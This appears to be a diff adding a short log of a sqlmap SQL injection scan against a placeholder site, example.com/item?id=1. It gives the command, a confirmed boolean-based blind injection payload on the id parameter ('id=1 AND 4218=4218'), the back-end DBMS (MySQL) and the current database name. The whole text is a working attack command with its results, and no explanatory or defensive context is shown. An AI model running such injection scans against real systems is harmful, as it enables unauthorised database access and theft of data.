@@ -1,0 +1,7 @@
+$ sqlmap -u "https://example.com/item?id=1" --batch
+Parameter: id (GET)
+Type: boolean-based blind
+Title: AND boolean-based blind - WHERE or HAVING clause
+Payload: id=1 AND 4218=4218
+back-end DBMS: MySQL >= 5.6
+current database: appdb
